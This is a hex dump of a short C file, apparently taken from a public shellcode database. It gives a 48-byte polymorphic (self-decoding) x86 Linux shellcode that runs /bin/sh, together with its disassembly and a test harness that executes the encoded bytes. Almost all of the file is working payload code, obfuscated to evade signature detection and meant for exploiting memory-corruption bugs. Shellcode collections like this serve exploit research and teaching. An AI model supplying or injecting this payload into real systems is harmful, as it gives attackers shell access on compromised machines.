00000000  2f 2a 0d 0a 0d 0a 20 54  69 74 6c 65 3a 20 09 50  |/*.... Title: .P|
00000010  6f 6c 79 6d 6f 72 70 68  69 63 20 53 68 65 6c 6c  |olymorphic Shell|
00000020  63 6f 64 65 20 2f 62 69  6e 2f 73 68 20 2d 20 34  |code /bin/sh - 4|
00000030  38 20 62 79 74 65 73 0d  0a 20 41 75 74 68 6f 72  |8 bytes.. Author|
00000040  3a 20 09 4a 6f 6e 61 74  68 61 6e 20 53 61 6c 77  |: .Jonathan Salw|
00000050  61 6e 0d 0a 20 4d 61 69  6c 3a 09 09 73 75 62 6d  |an.. Mail:..subm|
00000060  69 74 20 5b 21 5d 20 73  68 65 6c 6c 2d 73 74 6f  |it [!] shell-sto|
00000070  72 6d 2e 6f 72 67 20 0d  0a 0d 0a 20 09 21 20 44  |rm.org .... .! D|
00000080  61 74 61 42 61 73 65 20  6f 66 20 73 68 65 6c 6c  |ataBase of shell|
00000090  63 6f 64 65 20 3a 20 68  74 74 70 3a 2f 2f 77 77  |code : http://ww|
000000a0  77 2e 73 68 65 6c 6c 2d  73 74 6f 72 6d 2e 6f 72  |w.shell-storm.or|
000000b0  67 2f 73 68 65 6c 6c 63  6f 64 65 2f 0d 0a 0d 0a  |g/shellcode/....|
000000c0  0d 0a 20 4f 72 69 67 69  6e 61 6c 20 49 6e 66 6f  |.. Original Info|
000000d0  72 6d 61 74 69 6f 6e 73  0d 0a 20 3d 3d 3d 3d 3d  |rmations.. =====|
000000e0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
000000f0  0d 0a 0d 0a 20 44 69 73  61 73 73 65 6d 62 6c 79  |.... Disassembly|
00000100  20 6f 66 20 73 65 63 74  69 6f 6e 20 2e 74 65 78  | of section .tex|
00000110  74 3a 0d 0a 0d 0a 20 20  30 38 30 34 38 30 36 30  |t:....  08048060|
00000120  20 20 3c 2e 74 65 78 74  3e 3a 0d 0a 20 20 38 30  |  <.text>:..  80|
00000130  34 38 30 36 30 3a 09 20  33 31 20 63 30 20 20 20  |48060:. 31 c0   |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 09 20 78  |             . x|
00000150  6f 72 20 20 20 20 25 65  61 78 2c 25 65 61 78 0d  |or    %eax,%eax.|
00000160  0a 20 20 38 30 34 38 30  36 32 3a 09 20 35 30 20  |.  8048062:. 50 |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 09 20 70 75 73 68  20 20 20 25 65 61 78 0d  |  . push   %eax.|
00000190  0a 20 20 38 30 34 38 30  36 33 3a 09 20 36 38 20  |.  8048063:. 68 |
000001a0  32 66 20 32 66 20 37 33  20 36 38 20 20 20 20 20  |2f 2f 73 68     |
000001b0  20 20 09 20 70 75 73 68  20 20 20 24 30 78 36 38  |  . push   $0x68|
000001c0  37 33 32 66 32 66 0d 0a  20 20 38 30 34 38 30 36  |732f2f..  804806|
000001d0  38 3a 09 20 36 38 20 32  66 20 36 32 20 36 39 20  |8:. 68 2f 62 69 |
000001e0  36 65 20 20 20 20 20 20  20 09 20 70 75 73 68 20  |6e       . push |
000001f0  20 20 24 30 78 36 65 36  39 36 32 32 66 0d 0a 20  |  $0x6e69622f.. |
00000200  20 38 30 34 38 30 36 64  3a 09 20 38 39 20 65 33  | 804806d:. 89 e3|
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000220  09 20 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  |. mov    %esp,%e|
00000230  62 78 0d 0a 20 20 38 30  34 38 30 36 66 3a 09 20  |bx..  804806f:. |
00000240  35 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |50              |
00000250  20 20 20 20 20 09 20 70  75 73 68 20 20 20 25 65  |     . push   %e|
00000260  61 78 0d 0a 20 20 38 30  34 38 30 37 30 3a 09 20  |ax..  8048070:. |
00000270  35 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |53              |
00000280  20 20 20 20 20 09 20 70  75 73 68 20 20 20 25 65  |     . push   %e|
00000290  62 78 0d 0a 20 20 38 30  34 38 30 37 31 3a 09 20  |bx..  8048071:. |
000002a0  38 39 20 65 31 20 20 20  20 20 20 20 20 20 20 20  |89 e1           |
000002b0  20 20 20 20 20 09 20 6d  6f 76 20 20 20 20 25 65  |     . mov    %e|
000002c0  73 70 2c 25 65 63 78 0d  0a 20 20 38 30 34 38 30  |sp,%ecx..  80480|
000002d0  37 33 3a 09 20 39 39 20  20 20 20 20 20 20 20 20  |73:. 99         |
000002e0  20 20 20 20 20 20 20 20  20 20 09 20 63 6c 74 64  |          . cltd|
000002f0  20 20 20 0d 0a 20 20 38  30 34 38 30 37 34 3a 09  |   ..  8048074:.|
00000300  20 62 30 20 30 62 20 20  20 20 20 20 20 20 20 20  | b0 0b          |
00000310  20 20 20 20 20 20 09 20  6d 6f 76 20 20 20 20 24  |      . mov    $|
00000320  30 78 62 2c 25 61 6c 0d  0a 20 20 38 30 34 38 30  |0xb,%al..  80480|
00000330  37 36 3a 09 20 63 64 20  38 30 20 20 20 20 20 20  |76:. cd 80      |
00000340  20 20 20 20 20 20 20 20  20 20 09 20 69 6e 74 20  |          . int |
00000350  20 20 20 24 30 78 38 30  0d 0a 0d 0a 0d 0a 2a 2f  |   $0x80......*/|
00000360  0d 0a 0d 0a 23 69 6e 63  6c 75 64 65 20 22 73 74  |....#include "st|
00000370  64 69 6f 2e 68 22 0d 0a  0d 0a 63 68 61 72 20 73  |dio.h"....char s|
00000380  68 65 6c 6c 63 6f 64 65  5b 5d 20 3d 20 09 22 5c  |hellcode[] = ."\|
00000390  78 65 62 5c 78 31 31 5c  78 35 65 5c 78 33 31 5c  |xeb\x11\x5e\x31\|
000003a0  78 63 39 5c 78 62 31 5c  78 33 32 5c 78 38 30 22  |xc9\xb1\x32\x80"|
000003b0  0d 0a 09 09 09 22 5c 78  36 63 5c 78 30 65 5c 78  |....."\x6c\x0e\x|
000003c0  66 66 5c 78 30 31 5c 78  38 30 5c 78 65 39 5c 78  |ff\x01\x80\xe9\x|
000003d0  30 31 5c 78 37 35 22 0d  0a 20 20 09 09 09 22 5c  |01\x75"..  ..."\|
000003e0  78 66 36 5c 78 65 62 5c  78 30 35 5c 78 65 38 5c  |xf6\xeb\x05\xe8\|
000003f0  78 65 61 5c 78 66 66 5c  78 66 66 5c 78 66 66 22  |xea\xff\xff\xff"|
00000400  0d 0a 09 09 09 22 5c 78  33 32 5c 78 63 31 5c 78  |....."\x32\xc1\x|
00000410  35 31 5c 78 36 39 5c 78  33 30 5c 78 33 30 5c 78  |51\x69\x30\x30\x|
00000420  37 34 5c 78 36 39 22 0d  0a 09 09 09 22 5c 78 36  |74\x69"....."\x6|
00000430  39 5c 78 33 30 5c 78 36  33 5c 78 36 61 5c 78 36  |9\x30\x63\x6a\x6|
00000440  66 5c 78 38 61 5c 78 65  34 5c 78 35 31 22 0d 0a  |f\x8a\xe4\x51"..|
00000450  09 09 09 22 5c 78 35 34  5c 78 38 61 5c 78 65 32  |..."\x54\x8a\xe2|
00000460  5c 78 39 61 5c 78 62 31  5c 78 30 63 5c 78 63 65  |\x9a\xb1\x0c\xce|
00000470  5c 78 38 31 22 3b 0d 0a  0d 0a 69 6e 74 20 6d 61  |\x81";....int ma|
00000480  69 6e 28 29 0d 0a 7b 0d  0a 09 70 72 69 6e 74 66  |in()..{...printf|
00000490  28 22 50 6f 6c 79 6d 6f  72 70 68 69 63 20 53 68  |("Polymorphic Sh|
000004a0  65 6c 6c 63 6f 64 65 20  2d 20 6c 65 6e 67 74 68  |ellcode - length|
000004b0  3a 20 25 64 5c 6e 22 2c  73 74 72 6c 65 6e 28 73  |: %d\n",strlen(s|
000004c0  68 65 6c 6c 63 6f 64 65  29 29 3b 0d 0a 09 28 2a  |hellcode));...(*|
000004d0  28 76 6f 69 64 28 2a 29  28 29 29 20 73 68 65 6c  |(void(*)()) shel|
000004e0  6c 63 6f 64 65 29 28 29  3b 0d 0a 09 0d 0a 09 72  |lcode)();......r|
000004f0  65 74 75 72 6e 20 30 3b  0d 0a 7d                 |eturn 0;..}|
000004fb
